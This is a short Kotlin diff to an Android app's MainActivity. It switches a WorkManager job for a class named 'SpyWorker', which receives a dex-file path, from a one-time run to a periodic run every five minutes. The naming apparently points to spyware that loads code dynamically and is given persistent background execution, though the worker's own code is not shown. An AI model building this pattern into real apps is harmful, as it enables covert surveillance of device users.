@@ -64,7 +64,20 @@ class MainActivity : AppCompatActivity() {
         val constraints = Constraints.Builder()
             .setRequiredNetworkType(NetworkType.CONNECTED)
             .build()
-        val workRequest = OneTimeWorkRequestBuilder<SpyWorker>()
+
+        val workRequest = PeriodicWorkRequestBuilder<SpyWorker>(
+            5, TimeUnit.MINUTES, // repeatInterval (the period cycle)
+            1, TimeUnit.MINUTES
+        ).setInputData(dexInternalPath)
+            .setConstraints(constraints)
+            .build()
+        WorkManager.getInstance(this)
+            .enqueueUniquePeriodicWork(
+                "PeriodicSimpleWorkerName", // A unique name which for this operation
+                ExistingPeriodicWorkPolicy.REPLACE, // An ExistingPeriodicWorkPolicy
+                workRequest
+            )
+        /*val workRequest = OneTimeWorkRequestBuilder<SpyWorker>()
             .setInputData(dexInternalPath)
             .setBackoffCriteria(
                 BackoffPolicy.LINEAR, // The BackoffPolicy to use when increasing backoff time
@@ -81,6 +94,7 @@ class MainActivity : AppCompatActivity() {
                 ExistingWorkPolicy.REPLACE, // An ExistingWorkPolicy
                 workRequest
             )
+         */
     }
 
     private fun saveFile(inputStream: InputStream) {
